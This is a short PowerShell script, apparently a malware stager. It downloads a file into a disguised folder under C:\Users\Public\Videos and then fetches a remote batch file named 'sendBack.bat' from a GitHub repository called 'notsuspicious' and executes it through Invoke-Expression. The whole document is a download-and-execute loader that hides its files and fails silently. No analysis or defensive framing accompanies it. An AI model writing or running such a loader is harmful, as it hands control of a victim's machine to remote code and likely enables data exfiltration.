try {
    Invoke-WebRequest 'https://github.com/RaupenInspektor/Server/raw/main/url.txt' -OutFile 'C:\Users\Public\Videos\WindowsGraphicalUserInterface\url.txt'
}
catch {
    exit
}
Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/sendBack.bat" -UseBasicParsing).Content
